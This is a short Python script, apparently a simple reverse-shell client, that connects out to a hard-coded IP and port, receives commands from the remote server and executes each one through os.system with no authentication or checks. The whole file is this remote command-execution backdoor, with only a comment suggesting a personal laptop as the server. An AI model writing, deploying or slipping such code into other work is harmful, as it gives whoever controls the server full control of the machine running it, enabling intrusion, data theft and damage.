import socket
import os

def connect_to_server():
    host = "192.168.29.169"  # Replace with your laptop's IP
    port = 12345

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((host, port))
    print("Connected to the server")

    while True:
        command = client.recv(1024).decode()
        print(f"Command received: {command}")
        if command.lower() == "exit":
            break
        else:
            os.system(command)

    client.close()

if __name__ == "__main__":
    connect_to_server()
